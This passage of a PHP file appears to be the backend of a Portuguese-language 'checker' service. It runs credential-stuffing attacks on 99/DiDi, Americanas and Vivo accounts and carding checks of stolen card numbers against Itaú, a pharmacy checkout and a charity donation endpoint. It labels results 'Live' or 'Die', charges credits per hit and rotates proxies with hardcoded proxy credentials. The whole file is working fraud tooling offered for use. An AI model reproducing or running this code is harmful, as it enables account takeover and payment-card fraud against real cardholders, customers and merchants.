'q=%7B%22cell%22%3A%22'.$email.'%22%2C%22password%22%3A%22'.$senha.'%22%2C%22a3%22%3A%22pYl7D%2BoIC%2F41VjRJ7NMNh8xHoD4bp4WGtD018TK7eyREAsQl5CxaPMCeLy4zwJ0YRgzZbK0KT%2FytVKAs2djsszr3pQryGxrlBnrCon2%2ByRD2wvnjuZhg5BKYkV%2BQBbwliEKTP3d8%2Fm5Xf15bms8O63DKUPICVKB9aUIorScSHk%2F6NhEpsn6c92P5iTRIrgnUxxAKIRKLcREoxjawlyNYyWyUsLCgK9pb9msrdwv0uJgbrwhIdEbcjQ%3D%3D%22%2C%22api_version%22%3A%221.0.2%22%2C%22app_version%22%3A%226.10.2%22%2C%22appid%22%3A60004%2C%22canonical_country_code%22%3A%22BR%22%2C%22channel%22%3A%220%22%2C%22city_id%22%3A55000281%2C%22country_calling_code%22%3A%22%2B55%22%2C%22country_id%22%3A76%2C%22idfa%22%3A%22f6ac0c90-5925-4101-989f-2678efa08f38%22%2C%22imei%22%3A%22351564120708516A752C8A520EBD6B3A3DDA0F49C33505E%22%2C%22lang%22%3A%22pt-BR%22%2C%22lat%22%3A-10.94142%2C%22lng%22%3A-51.75133%2C%22map_type%22%3A%22gmap%22%2C%22model%22%3A%22SM-N950N%22%2C%22network_type%22%3A%22WIFI%22%2C%22os%22%3A%225.1.1%22%2C%22role%22%3A1%2C%22scene%22%3A2%2C%22suuid%22%3A%22AE434C7D581CA5C957A2677242F00C51%22%2C%22utcoffset%22%3A-240%7D', array('TripCountry: BR','Cityid: 55000281','Productid: 0','User-Agent: Android/5.1.1 didihttp OneNet/2.1.0.90 com.taxis99/6.10.2','Host: epassport.didiglobal.com'));




if (strpos($step_1, '"error":"Concluído"')) {

    echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha - Logado com sucesso - #striker-";
debitar_creditos("1.00");
contar_login();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";





}

break;
case 'itau':

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc= $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://internetnc4.itau.com.br/router-app/router');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$cc.'&portal=999&pre-login=pre-login&destino=&tipoLogon=9');
$pagamento = curl_exec($ch);



$pagamento = curl_exec($ch);
if (strpos($pagamento, 'N&uacute;mero do cart&atilde;o inv&aacute;lido')) { 
	echo '<span class="label label-danger">#Reprovada ❌ '.$lista.' @ComedorDeCasadassabia<br></span>';

}

elseif(strpos($pagamento, 'Por favor,aguarde alguns minutos e tente novamente')){

	echo '<span class="label label-danger">#Reprovada ❌ '.$lista.' - [INVALIDO] @ComedorDeCasadassabia<br></span>';
}


 else {
 $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
 echo '<span class="label label-success">#Aprovada ✅</span> '.$lista.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$brand.' | NIVEL: '.$level.' | GATE [ITAU] | <span class="label label-success">DEBITOU: '.$debitouu.'</span> @ComedorDeCasadassabia  <br>';
 debitar_creditos("1.00");
contar_cc();
  }
 
curl_close($ch);
ob_flush();

break;
  case 'americanas':


extract($_GET);
error_reporting(0);

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

    function soNumero($str) {
        return preg_replace("/[^0-9]/", "", $str);
    }


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}



if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    extract($_GET);
}

function getStr2($string,$start,$end) {
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}


function Curl($url = false, $post = false, $header = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        return $exec;
    }
//*//*#Curl//*////*//

$username = 'auto';
$password = 'CtfMg3LQ6To6rmkpceschrQFo';
$proxy = 'proxy.apify.com:8000';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v1/customer-token?c_prime=false&c_b2wSid=jnaq9290&c_salesSolution=APP');
curl_setopt($ch, CURLOPT_USERAGENT, 'acom-android-2.67.0-21000111');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: sacola.americanas.com.br',
'Connection: Keep-Alive',
'Content-Type: application/vnd.login.b2w+json',
'Authorization: Basic YXBwYW5kcm9pZGFjb206R0ZqYjIwNg=='
));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$senha.'","login":"'.$email.'"}');
$fim = curl_exec($ch);

$token = getStr2($fim, '"token":"', '"');
$costumer = getStr2($fim, '"href":"/customer/', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'titzkzpb-rotate:lf56n8xt3dof');
curl_setopt($ch, CURLOPT_URL, 'http://app-bff-v2-americanas.b2w.io/order-info/?customerId='.$costumer.'&token='.$token.'&offset=1&limit=5');
curl_setopt($ch, CURLOPT_USERAGENT, 'acom-android-2.67.0-21000111');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: app-bff-v2-americanas.b2w.io',
'Connection: Keep-Alive',
'Accept: application/json, text/plain, */*'
));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$fim2 = curl_exec($ch);


if(strpos($fim2, 'Produtos Comprados') !== false) {
  $pedidos = '<span class="badge badge-success">Pedidos: Sim</span>';
} else {
  $pedidos = '<span class="badge badge-danger">Pedidos: Não</span>';
}

if(strpos($fim2, 'Produtos Comprados') !== false) {
  $ultimo = getStr2($fim2, '"images":', '","');
  $ultimo = '<span class="badge badge-warning">'.$ultimo.'</span>';
  $status = getStr2($fim2, '"status":"', '"');
  $status = '<span class="badge badge-primary">'.$status.'</span>';
} else {
  $ultimo = '<span class="badge badge-danger">Não</span>';
  $status = '<span class="badge badge-danger">Sem pedido.</span>';
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v6/customer/'.$costumer.'');
curl_setopt($ch, CURLOPT_USERAGENT, 'acom-android-2.67.0-210001119');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host:  sacola.americanas.com.br',
'Connection: Keep-Alive',
'Accept: application/json, text/plain, */*',
'Authorization: Basic YXBwYW5kcm9pZGFjb206R0ZqYjIwNg==',
'access-token: '.$token.''
));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 $fim3 = curl_exec($ch);

if(strpos($fim3, ',"creditCard":') !== false) {
  $oneclick = '<span class="badge badge-success">Oneclick: Sim</span>';//<span class="badge badge-danger">Não</span>
} else {
  $oneclick = '<span class="badge badge-danger">Oneclick: Não</span>';//<span class="badge badge-success">Sim</span>
}

$nome = getStr2($fim3, '"fullName":"', '"');

if(strpos($fim3, '"type":{"pf"') !== false) {
  $tipo = 'Fisica';
} else {
  $tipo = 'Juridica';
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.americanas.com.br/api/v6/customer/'.$costumer.'/address');
curl_setopt($ch, CURLOPT_USERAGENT, 'acom-android-2.67.0-210001119');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host:  sacola.americanas.com.br',
'Connection: Keep-Alive',
'Accept: application/json, text/plain, */*',
'Authorization: Basic YXBwYW5kcm9pZGFjb206R0ZqYjIwNg==',
'access-token: '.$token.''
));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$fim4 = curl_exec($ch);

$cidade = getStr2($fim4, '"city":"', '"');
$estado = getStr2($fim4, '"state":"', '"');
$cidadestado = '<span class="badge badge-primary">Cidade: '.$cidade.' ('.$estado.')</span>';

$nome = '<span class="badge badge-primary">Nome: '.$nome.'</span>';
$tipo = '<span class="badge badge-primary">Tipo: '.$tipo.'</span>';


if (strpos($fim, 'AUTHENTICATED') !== false) {
 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha $nome $tipo $cidadestado $pedidos $oneclick - #striker-";
debitar_creditos("1.00");
contar_login();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";



}
break;
case 'vivo':
error_reporting(0);


function multiexplode($delimiters, $string) {
	$partida = str_replace($delimiters, $delimiters[0], $string);
	$executar = explode($delimiters[0], $partida);
	return $executar;
}
$lista = $_REQUEST['lista'];
$email = multiexplode(array(";", ":", "|", ">"), $lista)[0];
$senha = multiexplode(array(";", ":", "|", ">"), $lista)[1];


function puxar($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
} 

if (file_exists("cookie.txt")) {
        unlink("cookie.txt"); 
}

  //VARIAVEIS DE CONFIG
  
  $url = "https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/doLogin.do";
  
  $userAgent = "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36";
  $postField = 'cpf='.$email.'&senha='.$senha.'';

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
  curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Host: login.vivo.com.br',
'Connection: keep-alive',
'Content-Length: 28',
'Accept: application/json, text/javascript, */*; q=0.01',
'Origin: https://login.vivo.com.br',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Referer: https://login.vivo.com.br/mobile/appmanager/env/publico',
));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $postField);
  $resposta = curl_exec($ch);


if (strpos($resposta, '"message":"SUCCESS"') !== false) {
 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha| | [Nome: $nome] <font color='red'></font> | #MadibuX <br>";
debitar_creditos("1.00");
contar_login();
}else{
   
       echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";
       
       
       
 

}
break;
case 'allbins3':
error_reporting(0);
$lista = $_GET['lista'];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];


function puxar($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$loadtime = time();
function getStrc($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}
switch ($mes) {
    case '1': $mes = '01';
        break;
    case '4': $mes = '04';
        break;
    case '7': $mes = '07';
        break;
    case '2': $mes = '02';
        break;
    case '5': $mes = '05';
        break;
    case '8': $mes = '08';
        break;
    case '3': $mes = '03';
        break;
    case '6': $mes = '06';
        break;
    case '9': $mes = '09';
        break;

}
switch ($ano) {
         case '19':$ano = '2019';break;
         case '20':$ano = '2020';break;
         case '21':$ano = '2021';break;
         case '22':$ano = '2022';break;
         case '23':$ano = '2023';break;
         case '24':$ano = '2024';break;
         case '25':$ano = '2025';break;
         case '26':$ano = '2026';break;
         case '27':$ano = '2027';break;
         case '28':$ano = '2028';break;

}



$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.4devs.com.br/ferramentas_online.php',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_POSTFIELDS => 'acao=gerar_pessoa&sexo=H&idade=22&pontuacao=S&cep_estado=&cep_cidade=',
    ));

$exe9 = curl_exec($ini);
//echo $exe9;
$nome = puxar($exe9, 'nome":"', '"');
$enderec = puxar($exe9, 'endereco":"', '"');






$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/customer/account/login/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/customer/account/login'

    ),
    ));

$exe = curl_exec($ini);
$token = puxar($exe, '<input name="form_key" type="hidden" value="', '"');
//echo $exe;




$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/customer/account/loginPost/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/customer/account/login'

    ),
    CURLOPT_POSTFIELDS => 'form_key='.$token.'&login%5Busername%5D=contaqualquer789%40outlook.com&login%5Bpassword%5D=cucunha123&send='
    ));

$exe2 = curl_exec($ini);
//echo $exe2;





$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/ajaxcart/cart/add/uenc/aHR0cHM6Ly93d3cuZmFybWFjb25kZS5jb20uYnIvbWFlLWUtYmViZQ,,/product/13327/form_key/$formkey/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/javascript, text/html, application/xml, text/xml, */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/mae-e-bebe'

    ),
    CURLOPT_POSTFIELDS => 'ajax_package_name=rwd&ajax_layout=default&ajax_template=default&ajax_skin=default'
    ));

$exe3 = curl_exec($ini);
//echo $exe3;






$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/checkout/onepage/saveBilling/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/javascript, text/html, application/xml, text/xml, */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/checkout/onepage/'

    ),
    CURLOPT_POSTFIELDS => 'billing%5Baddress_id%5D=177454&billing%5Bfirstname%5D='.$nome.'&billing%5Blastname%5D=MACROSO%20JONASPPE%20Peixoto&billing%5Bpostcode%5D=76876-378&billing%5Bstreet%5D%5B%5D=Rua%20S%C3%A3o%20Jos%C3%A9%20dos%20Campos&billing%5Bstreet%5D%5B%5D=520&billing%5Bstreet%5D%5B%5D=Setor%2009%C2%A0&billing%5Bstreet%5D%5B%5D=CASA&billing%5Bcity%5D=Ariquemes&billing%5Bregion_id%5D=505&billing%5Bregion%5D=&billing%5Bcountry_id%5D=BR&billing%5Btelephone%5D=(69)%2098595-3632&billing%5Bfax%5D=(69)%2098595-3632&billing%5Bsave_in_address_book%5D=1&billing%5Buse_for_shipping%5D=1'
    ));

$exe4 = curl_exec($ini);
//echo $exe4;





$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/checkout/onepage/saveShippingMethod/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/javascript, text/html, application/xml, text/xml, */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/checkout/onepage/'

    ),
    CURLOPT_POSTFIELDS => 'shipping_method=frenetshipping_04669&estimate_method=frenetshipping_04162&form_key=$formkey'
    ));

$exe5 = curl_exec($ini);
//echo $exe5;




$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/checkout/onepage/savePayment/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/javascript, text/html, application/xml, text/xml, */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/checkout/onepage/'

    ),
    CURLOPT_POSTFIELDS => 'payment%5Bmethod%5D=rede_adquirencia&payment%5Bsession_id%5D=1c4de9eeedad4c98db8ea85ba32dc6b742e1237f&payment%5Bcc_owner%5D=JANEVES%20PENES%20P&payment%5Bcc_number%5D='.$cc.'&payment%5Bcc_type%5D=&payment%5Bcc_exp_month%5D='.$mes.'&payment%5Bcc_exp_year%5D='.$ano.'&payment%5Bcc_cid%5D='.$cvv.'&payment%5Bcc_installments%5D=1&payment%5Bcc_type%5D=ITAU_SLIP&form_key='.$formkey.''
    ));

$exe6 = curl_exec($ini);
//echo $exe6;




$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/checkout/onepage/saveOrder/form_key/$formkey/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/javascript, text/html, application/xml, text/xml, */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://www.farmaconde.com.br',
        'Referer: https://www.farmaconde.com.br/checkout/onepage/'

    ),
    CURLOPT_POSTFIELDS => 'payment%5Bmethod%5D=rede_adquirencia&payment%5Bsession_id%5D=1c4de9eeedad4c98db8ea85ba32dc6b742e1237f&payment%5Bcc_owner%5D=JANEVES%20PENES%20P&payment%5Bcc_number%5D='.$cc.'&payment%5Bcc_type%5D=&payment%5Bcc_exp_month%5D='.$mes.'&payment%5Bcc_exp_year%5D='.$ano.'&payment%5Bcc_cid%5D='.$cvv.'&payment%5Bcc_installments%5D=1&payment%5Bcc_type%5D=ITAU_SLIP&form_key='.$formkey.''
    ));

$exe7 = curl_exec($ini);




$ini = curl_init();

curl_setopt_array($ini, array(

    CURLOPT_URL => 'https://www.farmaconde.com.br/adquirencia/checkout/verify/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_POST => 0,
    CURLOPT_COOKIEJAR => getcwd(). "/cookies.txt",
    CURLOPT_COOKIEFILE => getcwd(). "/cookies.txt",
    CURLOPT_HTTPHEADER => array(
        'Host: www.farmaconde.com.br',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer: https://www.farmaconde.com.br/checkout/onepage/'

    ),
    ));

$exe8 = curl_exec($ini);
//echo $exe8;

$valores = array('R$ 1,00','R$ 50,50','R$ 50,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

$valores = array('R$ 1,00','R$ 50,50','R$ 50,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

if (strpos($exe7, "Identified moderate risk by the issuer.") !== false) {

echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜  $cc|$mes|$ano|$cvv | Debitou : $debitouu | Tempo de Resposta: ". (time() - $loadtime) ." seg |<span class='badge badge-light'> $bin</span>  - #striker-";
debitar_creditos("1.00");
contar_cc();
}else if(stripos($exe7, 'invalid security code') !==false ){
	
  die("<font color='lime'> Aprovada </font>➜ $lista |  Retorno: Unauthorized. Invalid security code| ");
}else if (strpos($exe7, 'Pague com a Rede:<\/strong>') !==false){

$msg = puxar($exe7,'Pague com a Rede:<\/strong>','\t\t\t<\/div>');
echo "Reprovada ➔ $lista | Retorno: [<font color='red'>$msg</font>] <br>";
}else{
    $cod =  "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $cc|$mes|$ano|$cvv | $msg |- #STRIKER";
    }

echo $cod;
    break;
case 'ggbb':
error_reporting(0);
    
    
        
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

    
    

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://donation.cancerresearchuk.org/api/payments/payment/');
    curl_setopt($ch, CURLOPT_HEADER, 0);
   curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'wuosaueq-rotate:ud41gvg6m3tq');
curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:80'); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'rushugsc-rotate:8cou3rof7ho8');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/javascript, */*; q=0.01',
'Origin: https://donation.cancerresearchuk.org',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-J105B Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36',
'Content-Type: application/json',
'Referer: https://donation.cancerresearchuk.org/my-donation/?type=single&amount=10'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
